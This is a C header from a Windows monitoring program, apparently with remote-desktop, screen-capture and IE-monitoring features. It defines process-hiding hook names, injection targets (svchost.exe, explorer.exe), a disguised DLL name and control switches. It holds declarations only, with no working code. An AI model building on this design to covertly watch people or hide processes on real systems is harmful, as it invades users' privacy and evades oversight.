

#ifndef  __QWMHIDEPROCESSCOMMPROC_H__
#define  __QWMHIDEPROCESSCOMMPROC_H__	/*  {  */

#ifndef  __QYTYPES_H__
typedef  struct  __qyDmItem_t			{
				 long					type;
				 TCHAR				*	des;
				 TCHAR				*	pData;
				 //  long				flg;
				 //  long				data;
}		 QY_DMITEM;
#endif

//  #define		CONST_remoteProcessName					"winlogon.exe"		//  2005/07/28
#define		CONST_remoteProcessName_sys					"svchost.exe"			//  2007/01/11
#define		CONST_remoteProcessName_usr					"explorer.exe"			//  2007/01/14, 用来保护用户线程

//
#define		CONST_mutexNameForRemote					"wmRemoteMms"
#define		CONST_mutexNameForQwmHelp2					"wmzninws"
#define		CONST_mutexNameForClearQwmHelp2				"wcmsnyzns3"
#define		CONST_mutexName_syncQwmGBuf					"sncQminsen"		//  2007/01/27, 为qwmGBuf的处理同步用

//
#define		CONST_qwmCmdLine_recoveredByQwmHelp2		"-rcv7nymxyf"		//  2005/07/30
#define		CONST_qwmCmdLine_regOnly					"-ro9523h"
//  #define		CONST_qwmCmdLine_regAndInstall			"-ri52vcj"
//  #define		CONST_qwmCmdLine_bChild					"-bChd"
//  2005/05/01
#define		CONST_qwmCmdLine_doSecChk					"-sChd"
#define		CONST_qwmCmdLine_chdRespOk					"-rok"				//  20050504
#define		CONST_qwmCmdLine_doReboot					"-rbt"				//  2005/05/31
#define		CONST_qwmCmdLine_doRemoveUsb				"-rUsb"				//  2005/10/08
#define		CONST_qwmCmdLine_viewRemoteDesktop			"-rRd"				//  2006/02/12
#define		CONST_qwmCmdLine_monDesktop					"-rMd"				//  2006/03/06
#define		CONST_qwmCmdLine_capScreen					"-rCs"				//  2006/03/06
#define		CONST_qwmCmdLine_monIe						"-rMIe"				//  2006/03/07
#define		CONST_qwmCmdLine_netFlowWarn				"-rNf"				//  2006/09/12
#define		CONST_qwmCmdLine_usrScript					"-rUsr"				//  2007/01/11
#define		CONST_qwmCmdLine_startProtectingThread_sys	"-rPts"				//  2007/01/31
#define		CONST_qwmCmdLine_startProtectingThread_usr	"-rPtu"				//  2007/01/31


#define		CONST_qwmCmdLine_rdAddNewClient				"-connect"			//  2006/10/03


#define		CONST_qwmCfgFile							"wn8m.ini"			//  2006/03/25

#define		CONST_processName_qwmSvr					"qwmSvr.exe"				//  2007/01/15
//  #define		CONST_hideProcessDll					"qwmHelp.dll"				//  2005/06/06, 使dll不要限于这一个名字，可以用qwmHelp1.dll, 呵呵
#define		CONST_hideProcessDll0						"qwmHelp.dll"				//  2005/06/06, 使dll不要限于这一个名字，可以用qwmHelp1.dll, 呵呵
#define		CONST_hideProcessDll1						"qwmHelp1.dll"				//  2005/06/06, 使dll不要限于这一个名字，可以用qwmHelp1.dll, 呵呵
#ifndef  __BZAZ__
	#define		CONST_qwmHelp2Dll						"winmn3.dll"				//	"qwmHelp2.dll"		//  2005/07/26
#else
	#define		CONST_qwmHelp2Dll						"qwmHelp2.dll"		//  2005/07/26
#endif
#define		CONST_qwmRdDll								"qwmRd.dll"					//  2006/02/13
#define		CONST_qwmHelp3Dll							"qwmHelp3.dll"				//  2006/02/13
#define		CONST_qwmRdHelpDll							"qwmRdHelp.dll"				//  2006/02/13


//
#define		CONST_getVerName							"getVer"
#define		CONST_hideHookName							"hideProcess"
#define		CONST_showHookName							"showProcess"
//
//	#define		CONST_qwmHelpDllVer							"0109"			//  2005/09/09
//  #define		CONST_qwmHelpDllVer							"0110"			//  2009/04/06
#define		CONST_qwmHelpDllVer							"0111"			//  2010/05/10

//
//  #define		CONST_qwmHelp2DllVer					"0102"			//  2005/07/26
//  #define		CONST_qwmHelp2DllVer					"0103"			//  2007/01/16
//  #define		CONST_qwmHelp2DllVer					"0104"			//  2007/01/31
//	#define		CONST_qwmHelp2DllVer						"0105"			//  2007/02/09
//  #define		CONST_qwmHelp2DllVer						"0106"			//  2009/04/06
#define		CONST_qwmHelp2DllVer						"0107"			//  2010/05/10

//
//  #define		CONST_qwmRdDllVer						"0104"			//  2006/07/22
//  #define		CONST_qwmRdDllVer						"0105"			//  2006/08/21
#define		CONST_qwmRdDllVer							"0106"			//  2007/02/09
//
//  #define		CONST_qwmHelp3DllVer					"0103"			//  2006/02/13
#define		CONST_qwmHelp3DllVer						"0104"			//  2007/02/09
//
//  #define		CONST_qwmRdHelpDllVer					"0103"			//  2006/02/13
#define		CONST_qwmRdHelpDllVer						"0104"			//  2007/02/09


//  2006/03/06, 版本说明
//  rdDll	0102	第一版				//  2006/02/13
//			0103	提供远程监控功能	//  2006/03/06
//  qwmHelp2
//			0102	对qwmSvr做保护，只有一个实例
//			0103	对qwmSvr做保护，可有很多个实例（暂时只有一个实例
//					对qwmSvr_usrScript做保护，每个usrScript有一个实例
//					开辟了一个所有进程的共享空间
//


typedef  struct	 __qnmRdStruct_t	{
				 unsigned  long		ulCntIp;
				 unsigned  char		ucbMonDesktop;	//  2006/03/06
				 int				iErr;
				 unsigned  char		ucbStopSockReloaded;
				 void			*	pEnv;			//  2007/02/09
}		QNM_RD_STRUCT;

extern  QNM_RD_STRUCT  gQnmRdStruct;


//  以下没用了，2007/02/09
#define		CONST_dataBufSize_qwmGBuf					16000

typedef  struct  __qwmGBuf_t							{						//  qwmSvr的服务程序和用户脚本程序共享的数据区，2007/01/13
				 char									dataBuf[CONST_dataBufSize_qwmGBuf];
}		 QWM_GBUF;
//  


#ifdef  __cplusplus
  extern  "C"  {
#endif
	
int  getModuleDirAndFinalName(  TCHAR  *  svFileName,  unsigned  int  size,  TCHAR  *  finalName,  unsigned  int  finalNameSize    );
//

BOOL  bMyPermittedProcess(  );


__declspec( dllexport )  int  setQwmQuit(  BOOL  bQuit,  unsigned  long  ulProcessId_remoteProcess  );
__declspec( dllexport )  BOOL  bQwmQuit(  unsigned  long  ulProcessId  );

__declspec( dllexport )  int  setQwmUsrScriptQuit(  BOOL  bQuit  );
__declspec( dllexport )  BOOL  bQwmUsrScriptQuit(  );


//
__declspec( dllexport )  void  *  getQwmGBuf(  );


#ifdef  __cplusplus
  }
#endif


#endif  /*  }  */

